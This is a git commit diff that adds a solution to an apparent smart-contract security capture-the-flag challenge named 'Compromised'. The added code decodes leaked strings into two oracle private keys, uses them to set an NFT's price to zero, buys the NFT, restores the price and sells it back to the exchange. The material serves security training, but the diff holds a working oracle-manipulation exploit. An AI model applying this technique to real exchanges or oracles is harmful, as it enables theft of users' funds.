3c485308160a2192080c813213aac920e7666758
alymurtazamemon <alimurtaza-assistant@outlook.com>
2023-06-22 15:02:30 +0500

    solve challenge 7 - compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,46 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const leakToPrivateKey = (leak) => {
+            const base64 = Buffer.from(
+                leak.split(` `).join(``),
+                `hex`
+            ).toString(`utf8`);
+            const hexKey = Buffer.from(base64, `base64`).toString(`utf8`);
+            return hexKey;
+        };
+        
+        const key1 = leakToPrivateKey(
+            "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
+        );
+        
+        const key2 = leakToPrivateKey(
+            "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+        );
+
+        // * these two oracles are compromised. We can see their addresses using oracle.address
+        const oracle1 = new ethers.Wallet(key1, ethers.provider);
+        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+
+        // * manipulate the oracle prices
+        await oracle.connect(oracle1).postPrice(nftToken.symbol(), 0);
+        await oracle.connect(oracle2).postPrice(nftToken.symbol(), 0);
+
+        // * but cheap nft
+        await exchange.connect(player).buyOne({ value: "10000000000000" });
+
+        // * reset the oracle prices
+        await oracle
+            .connect(oracle1)
+            .postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);
+        await oracle
+            .connect(oracle2)
+            .postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);
+
+        // * sell expensive nft
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
